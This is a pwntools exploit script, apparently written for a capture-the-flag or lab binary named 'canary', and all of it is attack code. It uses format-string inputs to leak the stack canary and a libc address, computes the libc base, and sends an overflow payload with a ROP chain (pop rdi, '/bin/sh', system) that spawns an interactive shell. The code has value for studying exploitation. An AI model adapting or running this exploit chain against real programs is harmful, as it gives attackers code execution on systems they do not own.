from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
path = "./canary"


#io = process(path)
io = gdb.debug(path, '''
            b main
            '''
        )

e = ELF(path)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")


bin_echo = 0x402060

cycle = cyclic(500)
offset = cyclic_find(0x6161616f)
cmd_offset = cyclic_find(0x6161617261616171)
canary_cycle = cyclic_find(0x61616c6161616b61) + 1              # to account for the 'd' we had to send in w/ the cycle
canary_offset = 88 - (canary_cycle + 8) 
ret_offset = offset - ((canary_offset+8) + canary_cycle + 8)

io.recvuntil(b"Enter your input:\n")
io.sendline(b"b")
io.recvuntil(b"(8-byte slots from buffer base): ")
io.sendline(b"0")
io.recvuntil(b"(hex, e.g. 0x...): ")
io.sendline(b"0x7024393125")      # %8$p

io.recvuntil(b"Enter your input:\n")
io.sendline(b"c")
io.recvuntil(b"input:\n")
canary = int(io.recvuntil("Enter").split(b'E')[0].decode('utf-8'), 16)
print(hex(canary))


io.recvuntil(b"your input:\n")
io.sendline(b"b")
io.recvuntil(b"(8-byte slots from buffer base): ")
io.sendline(b"0")
io.recvuntil(b"(hex, e.g. 0x...): ")
io.sendline(b"0x2570202570202570")      # %p

io.recvuntil(b"Enter your input:\n")
io.sendline(b"b")
io.recvuntil(b"(8-byte slots from buffer base): ")
io.sendline(b"1")
io.recvuntil(b"(hex, e.g. 0x...): ")
io.sendline(b"0x20257020257020")      # %p

io.recvuntil(b"Enter your input:\n")
io.sendline(b"c")
io.recvuntil(b"your input:\n")
leaks = io.recvuntil("Enter").split()
libc_leak = int(leaks[-1].split(b'(')[0].decode('utf-8'), 16)

print(hex(libc_leak))

libc.address = libc_leak - 1132514
print(libc.address)
rdi_gadget = libc.address + 0x000000000002a3e5 # pop rdi; ret
ret_gadget = rdi_gadget + 1
binsh = next(libc.search(b"/bin/sh"))

payload = b"d" * canary_cycle + p64(canary) + b"A" * (offset - (canary_cycle + 8)) + p64(ret_gadget) + p64(rdi_gadget) + p64(binsh) + p64(libc.symbols["system"])

io.recvuntil(b"input:\n")
io.sendline(payload)

io.interactive()


